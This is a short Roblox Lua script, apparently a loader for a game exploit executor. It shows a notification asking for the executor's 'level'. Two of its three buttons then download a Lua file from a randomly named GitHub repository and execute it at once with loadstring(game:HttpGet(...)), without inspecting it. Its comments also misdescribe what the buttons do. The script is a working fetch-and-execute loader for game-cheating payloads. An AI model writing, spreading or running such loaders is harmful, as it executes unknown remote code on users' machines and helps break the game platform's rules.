local StarterGui = game:GetService("StarterGui")

-- Function to handle button press
local function onNotificationPressed(buttonPressed)
    if buttonPressed == "Level 3 Or Lower" then
        -- Run the loadstring when OK is pressed
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/s4n8m2k6q1h9j7v5t3f2r9p7y2g8l3w6x7z9v5/s9r3v5k7t1f2n9l7y2g8q4m6p8z1x3w7b9j2v5/refs/heads/main/level3orlower.lua", true))()
        end)

        if not success then
            warn("Error running script: " .. err)
        end

    elseif buttonPressed == "Level 4 Or Higher" then
        -- Show Developer Console when "Cancel" is pressed
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s4n8m2k6q1h9j7v5t3f2r9p7y2g8l3w6x7z9v5/s9r3v5k7t1f2n9l7y2g8q4m6p8z1x3w7b9j2v5/refs/heads/main/level4orhigher.lua", true))()
    end
end

-- Notification callback function
local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = onNotificationPressed

-- Initial notification
StarterGui:SetCore("SendNotification", {
    Title = "S.E.T",
    Text = "Please Select What Level Your Executor Is To Continue.",
    Duration = 5,
    Button1 = "Level 3 Or Lower",
    Button2 = "Level 4 Or Higher",
    Button3 = "Check",
    Callback = NotificationBindable
})
